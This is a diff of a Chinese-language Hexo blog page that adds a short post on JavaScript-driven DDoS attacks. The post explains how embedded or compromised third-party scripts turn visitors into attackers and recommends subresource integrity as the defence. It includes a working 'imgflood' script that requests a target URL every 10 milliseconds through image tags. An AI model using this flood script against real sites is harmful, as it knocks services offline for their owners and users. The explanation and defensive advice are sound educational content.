@@ -98,17 +98,21 @@
 
 
 
-  <meta name="description" content="Now You See Me!">
+  <meta name="description" content="关于JavaScript的DDoS攻击 引用： https://www.freebuf.com/news/66447.html  该攻击属于应用层攻击 Javascript实现DDos攻击原理分析   　　现在网站的交互性都是通过JavaScript来实现的。通过添加JavaScript直接插入HTML元素，或通过远程来加载JavaScript。浏览器会读取script标签中的src属性并运行它所">
+<meta name="keywords" content="Network,DDoS,JavaScript">
 <meta property="og:type" content="article">
-<meta property="og:title" content="DDoS-Javascript">
+<meta property="og:title" content="DDoS-JavaScript">
 <meta property="og:url" content="http://magic-king.net/2019/12/12/DDoS-Javascript/index.html">
 <meta property="og:site_name" content="Hexo&amp;Magic">
-<meta property="og:description" content="Now You See Me!">
+<meta property="og:description" content="关于JavaScript的DDoS攻击 引用： https://www.freebuf.com/news/66447.html  该攻击属于应用层攻击 Javascript实现DDos攻击原理分析   　　现在网站的交互性都是通过JavaScript来实现的。通过添加JavaScript直接插入HTML元素，或通过远程来加载JavaScript。浏览器会读取script标签中的src属性并运行它所">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-12-12T07:41:36.170Z">
+<meta property="og:image" content="http://magic-king.net/2019/12/12/DDoS-Javascript/1.jpg">
+<meta property="og:image" content="http://magic-king.net/2019/12/12/DDoS-Javascript/2.jpg">
+<meta property="og:updated_time" content="2019-12-12T07:57:24.579Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="DDoS-Javascript">
-<meta name="twitter:description" content="Now You See Me!">
+<meta name="twitter:title" content="DDoS-JavaScript">
+<meta name="twitter:description" content="关于JavaScript的DDoS攻击 引用： https://www.freebuf.com/news/66447.html  该攻击属于应用层攻击 Javascript实现DDos攻击原理分析   　　现在网站的交互性都是通过JavaScript来实现的。通过添加JavaScript直接插入HTML元素，或通过远程来加载JavaScript。浏览器会读取script标签中的src属性并运行它所">
+<meta name="twitter:image" content="http://magic-king.net/2019/12/12/DDoS-Javascript/1.jpg">
 
 
 
@@ -128,7 +132,7 @@
   };
 </script>
 
-  <title>DDoS-Javascript | Hexo&Magic</title>
+  <title>DDoS-JavaScript | Hexo&Magic</title>
   
 
 
@@ -391,7 +395,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">DDoS-Javascript
+          <h1 class="post-title" itemprop="name headline">DDoS-JavaScript
 
               
             
@@ -417,12 +421,34 @@
                 
               
 
-              <time title="创建时间：2019-12-12 15:41:36" itemprop="dateCreated datePublished" datetime="2019-12-12T15:41:36+08:00">2019-12-12</time>
+              <time title="创建时间：2019-12-12 15:41:36 / 修改时间：15:57:24" itemprop="dateCreated datePublished" datetime="2019-12-12T15:41:36+08:00">2019-12-12</time>
             
 
+            
+              
+
+              
             
           </span>
 
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/DDoS/" itemprop="url" rel="index"><span itemprop="name">DDoS</span></a></span>
+
+                
+                
+              
+            </span>
           
 
           
@@ -459,7 +485,34 @@
       
 
       
-        
+        <h1 id="关于JavaScript的DDoS攻击"><a href="#关于JavaScript的DDoS攻击" class="headerlink" title="关于JavaScript的DDoS攻击"></a>关于JavaScript的DDoS攻击</h1><blockquote>
+<p>引用：</p>
+<p><a href="https://www.freebuf.com/news/66447.html" target="_blank" rel="noopener">https://www.freebuf.com/news/66447.html</a></p>
+</blockquote>
+<h3 id="该攻击属于应用层攻击"><a href="#该攻击属于应用层攻击" class="headerlink" title="该攻击属于应用层攻击"></a>该攻击属于应用层攻击</h3><ul>
+<li><strong>Javascript实现DDos攻击原理分析</strong></li>
+</ul>
+<blockquote>
+<p>　　现在网站的交互性都是通过JavaScript来实现的。通过添加JavaScript直接插入HTML元素，或通过远程来加载JavaScript。浏览器会读取script标签中的src属性并运行它所指向的脚本，其实不只是script标签可以用来攻击，简单来说只要是可以跨域访问的标签，如img，link等都可以实现DDos攻击。</p>
+<p>　　既然这些标签可以访问外站的资源，那么我们是不是就可以设个定时器无限访问这个网站，从而达到攻击呢，那是肯定的。</p>
+</blockquote>
+<p><img src="/2019/12/12/DDoS-Javascript/1.jpg"></p>
+<p>如果攻击者在一个网站中嵌入了恶意JavaScript脚本，那么该网站的每一个访客都将成为DDoS攻击中的一员。网站流量越高就意味着DDoS越严重。</p>
+<p><strong>入侵共享JavaScript的第三方服务器</strong></p>
+<p>许多网站使用的都是普通的JavaScript库，为了节约带宽、提升性能，通常还会将JavaScript脚本共享在第三方服务器上。也就是说如果网站上包含有指向第三方服务器的脚本标签，就意味着所有访问该网站的用户都将自动下载JavaScript脚本，并执行。不幸的是，如果攻击者入侵了该第三方服务器并在JavaScript脚本中注入了DDoS攻击代码，那结果可想而知了，所有的访客也将变成DDoS攻击中的一员。</p>
+<p>一段简单的JS代码就能发起DoS攻击</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script type=<span class="string">'text/javascript'</span>&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">imgflood</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="comment">//var TARGET = 'victim-website.com'</span></span><br><span class="line">	<span class="keyword">var</span> TARGET = <span class="string">"127.0.0.1:12345"</span></span><br><span class="line">	<span class="keyword">var</span> URI = <span class="string">'/index?'</span></span><br><span class="line">	<span class="keyword">var</span> pic = <span class="keyword">new</span> Image()</span><br><span class="line">	<span class="keyword">var</span> rand = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random()*<span class="number">1000</span>)</span><br><span class="line">	pic.src = <span class="string">'http://'</span>+TARGET+URI+<span class="string">'val='</span>+rand</span><br><span class="line">	<span class="comment">//pic.src = 'http://'+TARGET+URI+'val='+rand</span></span><br><span class="line">&#125;</span><br><span class="line">setInterval(imgflood, <span class="number">10</span>)</span><br><span class="line">alert(pic.src)</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">f*********************king</span><br><span class="line">&lt;script type=<span class="string">'text/javascript'</span>&gt;imgflood()&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>body&gt;</span><br></pre></td></tr></table></figure>
+<p><code>setInterval(code, millisec)</code>:以millisec 毫秒的间隔执行code</p>
+<p>由于大部分网页引用jquery是从外部引用的，因此可以从此发起中间人攻击</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://code.jquery.com/jquery-1.10.2.min.js"</span>&gt;</span><span class="undefined"></span></span><br></pre></td></tr></table></figure>
+<p>预防的话，就是通过script标签支持的属性integrity：这个属性支持验证该js脚本的hash值，确保不会引用来自外部恶意的js脚本</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://code.jquery.com/jquery-1.10.2.min.js"</span>  </span></span><br><span class="line"><span class="tag">        <span class="attr">integrity</span>=<span class="string">"sha256-C6CB9UYIS9UJeqinPHWTHVqh/E1uhG5Twh+Y5qFQmYg="</span></span></span><br><span class="line"><span class="tag">         <span class="attr">crossorigin</span>=<span class="string">"anonymous"</span>&gt;</span><span class="undefined"></span></span><br></pre></td></tr></table></figure>
+<p>中间人攻击示意图：攻击其中的请求外部js的途径</p>
+<p><img src="/2019/12/12/DDoS-Javascript/2.jpg" alt></p>
+<hr>
+<p><strong>在写js-DDoS的问题</strong>：</p>
+<h4 id="HTML引入外部js脚本，放在head中不起作用-放在body中才起作用"><a href="#HTML引入外部js脚本，放在head中不起作用-放在body中才起作用" class="headerlink" title="HTML引入外部js脚本，放在head中不起作用,放在body中才起作用"></a><a href="https://blog.csdn.net/SeekAndFindYou/article/details/82219815" target="_blank" rel="noopener">HTML引入外部js脚本，放在head中不起作用,放在body中才起作用</a></h4><p>这是因为加载HTML文档时，先加载了js脚本后就不起作用了。<br>一般引入外部css文件放在head中，引入外部js脚本放在body中。<br>先渲染HTML文档(css)，再加载特效(js)</p>
+
       
     </div>
 
@@ -480,6 +533,16 @@
 
     <footer class="post-footer">
       
+        <div class="post-tags">
+          
+            <a href="/tags/Network/" rel="tag"># Network</a>
+          
+            <a href="/tags/DDoS/" rel="tag"># DDoS</a>
+          
+            <a href="/tags/JavaScript/" rel="tag"># JavaScript</a>
+          
+        </div>
+      
 
       
       
@@ -498,6 +561,10 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/12/12/DDoS-Javascript/fuck/" rel="prev" title>
+                 <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
@@ -541,8 +608,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <div class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <div class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -559,7 +635,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">30</span>
+                    <span class="site-state-item-count">32</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
@@ -608,7 +684,9 @@
                     
                       
                     
-                    <span class="site-state-item-count">16</span>
+                      
+                    
+                    <span class="site-state-item-count">17</span>
                     <span class="site-state-item-name">分类</span>
                   </a>
                 </div>
@@ -669,7 +747,11 @@
                     
                       
                     
-                    <span class="site-state-item-count">22</span>
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">24</span>
                     <span class="site-state-item-name">标签</span>
                   </a>
                 </div>
@@ -718,6 +800,23 @@
         </div>
       </div>
 
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#关于JavaScript的DDoS攻击"><span class="nav-number">1.</span> <span class="nav-text">关于JavaScript的DDoS攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#该攻击属于应用层攻击"><span class="nav-number">1.0.1.</span> <span class="nav-text">该攻击属于应用层攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#HTML引入外部js脚本，放在head中不起作用-放在body中才起作用"><span class="nav-number">1.0.1.1.</span> <span class="nav-text">HTML引入外部js脚本，放在head中不起作用,放在body中才起作用</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
       
 
       
